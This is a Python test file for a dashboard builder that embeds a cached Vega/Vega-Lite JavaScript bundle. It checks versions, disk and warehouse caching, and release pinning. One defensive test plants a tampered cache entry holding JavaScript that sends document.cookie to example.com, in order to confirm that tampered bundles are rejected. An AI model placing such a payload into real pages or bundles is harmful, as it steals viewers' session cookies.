"""The Vega runtime the Dive embeds is built at compile time and matches dbt Charts."""

from __future__ import annotations

import base64
import gzip
import json
import re
import subprocess
from pathlib import Path

import pytest
from dbt_charts_dive import bundle as B
from harness import build, project_dir  # session-cached compile of a board

VERSION_RE = re.compile(r'version\s*[:=]\s*"(\d+\.\d+\.\d+)"')


def _bundle_js(content: str) -> str:
    b64 = re.search(r'const VEGA_B64 = "([^"]+)"', content).group(1)
    return gzip.decompress(base64.b64decode(b64)).decode("utf-8")


def _node_versions(js: str) -> dict:
    """Evaluate the bundle the way the Dive does and read the library versions back."""
    script = (
        "globalThis.window = globalThis;"
        "new Function('require','exports','module','define', require('fs').readFileSync(process.argv[1],'utf8'))(undefined,undefined,undefined,undefined);"
        "const spec={mark:'bar',data:{values:[{a:'x',b:1}]},encoding:{x:{field:'a',type:'nominal'},y:{field:'b',type:'quantitative'}}};"
        "const vg=vegaLite.compile(spec).spec; new vega.View(vega.parse(vg),{renderer:'none'}).toSVG().then(s=>"
        "console.log(JSON.stringify({vega: vega.version, vegaLite: vegaLite.version, vegaEmbed: vegaEmbed.version, svg: s.length, fmt: vega.defaultLocale().format(',.2f')(1234.5)})));"
    )
    tmp = Path(__file__).parent / "build" / "bundle_check.js"
    tmp.parent.mkdir(exist_ok=True)
    tmp.write_text(js, encoding="utf-8")
    out = subprocess.run(["node", "-e", script, str(tmp)], capture_output=True, text=True, check=True, cwd=Path(__file__).parent)
    return json.loads(out.stdout.strip().splitlines()[-1])


def test_bundle_vegalite_matches_dct_spec_schema():
    """`vegalite_version: auto` → the Vega-Lite the specs' $schema names, i.e. the version
    vl-convert renders dbt Charts' SVG with; Vega and vega-embed are vl-convert's."""
    b = build("charts/sales_dashboard.yml")
    specs = [c["spec"] for c in b.manifest["charts"].values() if c.get("kind") == "vega"]
    schema = B.schema_version(specs)
    assert schema, "compiled specs carry a Vega-Lite $schema"
    info = b.manifest["bundle"]
    assert info["vega_lite"] == schema
    vlc = B.vl_convert_versions()
    assert info["vega"] == vlc["vega"] and info["vega_embed"] == vlc["vega_embed"]
    assert info["vl_convert"] == vlc["vl_convert"]


def test_bundle_runs_and_reports_the_configured_versions():
    b = build("charts/sales_dashboard.yml")
    info = b.manifest["bundle"]
    got = _node_versions(_bundle_js(b.content))
    assert got["vega"] == info["vega"]
    assert got["vegaLite"].startswith(info["vega_lite"])
    assert got["vegaEmbed"] == info["vega_embed"]
    assert got["svg"] > 1000 and got["fmt"] == "1,234.50"


def test_bundle_version_override_and_cache(tmp_path):
    """Bumping `dive.vegalite_version` swaps the runtime; the payload is cached per triple."""
    from dbt_charts_dive.builder import build_dive_from_boards

    vlc = B.vl_convert_versions()
    default = B.schema_version([c["spec"] for c in build("charts/sales_dashboard.yml").manifest["charts"].values() if c.get("spec")])
    assert default != "6.4.0", "pin a version the specs do not already name, or this test proves nothing"
    opts = {"vegalite_version": "6.4.0", "bundle_cache_dir": str(tmp_path)}
    b = build_dive_from_boards(project_dir(), ["charts/general/sales_dashboard.yml"], options=opts)
    info = b.manifest["bundle"]
    assert info["vega_lite"] == "6.4.0" and info["vega"] == vlc["vega"]
    cache = tmp_path / f"vega-{info['vega']}_vega-lite-6.4.0_vega-embed-{info['vega_embed']}.b64"
    assert cache.exists() and cache.stat().st_size > 100_000
    got = _node_versions(_bundle_js(b.content))
    assert got["vegaLite"] == "6.4.0" and got["vega"] == vlc["vega"]
    # second build with the same triple is served from cache/memo
    B._MEMO.clear()
    b2 = build_dive_from_boards(project_dir(), ["charts/general/sales_dashboard.yml"], options=opts)
    assert b2.manifest["bundle"]["source"] == "cache"


def test_unknown_version_fails_loudly(tmp_path):
    B._MEMO.clear()
    with pytest.raises(RuntimeError, match="vega-lite@99.0.0"):
        B.get_bundle(project_dir(), {"vegalite_version": "99.0.0", "bundle_cache_dir": str(tmp_path)}, [])


def test_warm_cache_is_reused(tmp_path):
    """A second build with the same versions reads the cached payload instead of jsDelivr."""
    from dbt_charts_dive.builder import build_dive_from_boards

    opts = {"bundle_cache_dir": str(tmp_path)}
    B._MEMO.clear()
    first = build_dive_from_boards(project_dir(), ["charts/general/sales_dashboard.yml"], options=opts)
    assert first.manifest["bundle"]["source"] == "cdn"
    cached = list(tmp_path.glob("*.b64"))
    assert len(cached) == 1 and cached[0].stat().st_size > 100_000

    B._MEMO.clear()
    second = build_dive_from_boards(project_dir(), ["charts/general/sales_dashboard.yml"], options=opts)
    assert second.manifest["bundle"]["source"] == "cache"
    assert _bundle_js(second.content) == _bundle_js(first.content)


def test_partial_vegalite_version_is_pinned_to_an_exact_release():
    """vl-convert reports "6.4"; the bundle must name the release jsDelivr actually served."""
    B._MEMO.clear()
    exact = B._exact_version("vega-lite", "6.4")
    assert exact and exact.count(".") == 2 and exact.startswith("6.4.")


# ── the cache holds code that runs in every viewer's browser ──────────────────
class FakeCache:
    """A warehouse cache table, with whatever rows a test puts in it."""

    def __init__(self, rows=None):
        self.rows = dict(rows or {})
        self.written: dict[str, str] = {}
        self._last = None

    def execute(self, sql, params=None):
        params = list(params or [])
        if sql.startswith("SELECT"):
            self._last = [(self.rows[params[0]],)] if params[0] in self.rows else []
        elif sql.startswith("INSERT"):
            self.written[params[0]] = params[1]
            self.rows[params[0]] = params[1]
        else:
            self._last = []
        return self

    def fetchone(self):
        return self._last[0] if self._last else None


def _cached_bundle(rows, tmp_path):
    B._MEMO.clear()
    cache = FakeCache(rows)
    B.use_warehouse_cache(cache, "vega_cache")
    try:
        return B.get_bundle(project_dir(), {"bundle_cache_dir": str(tmp_path)}, []), cache
    finally:
        B._WAREHOUSE = None
        B._MEMO.clear()


def test_a_tampered_cache_entry_is_not_shipped_to_a_viewer(tmp_path, capsys):
    """The cached payload is JavaScript that every viewer of every Dive runs. Anyone who can
    write the target schema can put something else there, and it would be embedded as-is."""
    real, _ = _cached_bundle({}, tmp_path)
    key = f"vega-{real.vega}_vega-lite-{real.vega_lite}_vega-embed-{real.vega_embed}"
    payload = base64.b64encode(gzip.compress(b"globalThis.fetch('https://example.com/?c='+document.cookie)")).decode()
    got, _ = _cached_bundle({key: payload}, tmp_path)
    assert got.b64 != payload
    assert "vega" in capsys.readouterr().out.lower()


def test_a_bundle_the_run_itself_fetched_is_cached_and_reused(tmp_path):
    real, cache = _cached_bundle({}, tmp_path)
    again, _ = _cached_bundle(cache.rows, tmp_path)
    assert again.b64 == real.b64 and again.source == "warehouse"
